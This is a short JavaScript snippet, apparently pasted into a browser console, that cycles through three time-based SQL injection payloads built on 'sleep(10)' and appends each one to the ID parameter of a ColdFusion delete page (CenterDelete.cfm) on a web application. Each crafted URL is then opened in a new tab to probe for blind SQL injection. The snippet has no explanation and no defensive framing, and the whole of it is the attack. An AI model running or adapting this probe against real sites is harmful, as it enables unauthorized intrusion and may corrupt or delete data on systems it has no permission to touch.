function openInNewTab(href) {
  Object.assign(document.createElement('a'), {
    target: '_blank',
    href: href,
  }).click();
}
let diccionario = ["'sleep(10)#","1+or+sleep(10)#","or+sleep(10)#",]

for (i = 0; i < diccionario.length; i++) {
  
  var url='https://application.com/vtd/CenterDelete.cfm?ID=2'+diccionario[i]+'&Table=TABCompletionStatus&View=%2A&BackUrl=Table%3DTABCompletionStatus';
  //window.open(url, '_blank');
  setTimeout(openInNewTab(url), 2000);
  console.log(url); 
}
==================================================================
